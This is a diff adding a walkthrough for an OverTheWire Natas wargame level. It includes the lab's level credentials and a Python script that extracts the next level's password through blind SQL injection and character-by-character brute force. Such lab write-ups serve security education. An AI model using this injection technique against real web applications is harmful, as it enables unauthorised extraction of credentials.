@@ -683,11 +683,68 @@ Step 6: Then you will see the password for level-15
 +  Password : SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
 + Domain : http://natas15.natas.labs.overthewire.org
 ## Explination  
+Step 1:  Go to Firefox Browser, Then Connect to natas15.natas.labs.overthewire.org, Then login with username and password
 
+Step 2: You will see the page like this
 
+![image](./images-1/image-15.png)
 
+Step 3: Then click view source code
 
+![image](./images-1/image-15-3.png)
 
+Step 4: Then enter natas16 for chekcing the existing user or not
+
+![image](./images-1/image-15-1.png)
+
+Step 5: It shows the like this
+
+![image](./images-1/image-15-2.png)
+
+Step 6: Then you will use Blind SQL injection to get the password for level-16, By using the Brute force attack.
+
+Step 7: Write code like this, In nano editor, Then save the file, Then Run the file by using python filename. Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
+
+    import requests
+    import re
+
+    characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+
+    username = 'natas15'
+    password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'
+
+    url = 'http://natas15.natas.labs.overthewire.org'
+
+    session = requests.Session()
+    current_password = []
+
+    while True:
+     for character in characters:
+        print("Trying with: " + "".join(current_password) + character)
+
+        response = session.post(
+            url,
+            data={
+                "username": 'natas16" and password like binary "' +
+                            "".join(current_password) + character + '%" #'
+            },
+            auth=(username, password)
+        )
+
+        if "This user exists." in response.text:
+            current_password.append(character)
+            break
+
+     if len(current_password) == 32:
+        break
+
+Step 8: It will fetch one by one like loop, By using of Bruteforce attack, Then you will wait until it will get the password for level-16
+
+![image](./images-1/image-15-4.png)
+
+Step 9: Then you will see the password for level-16
+
+![image](./images-1/image-15-5.png)
 
 
 
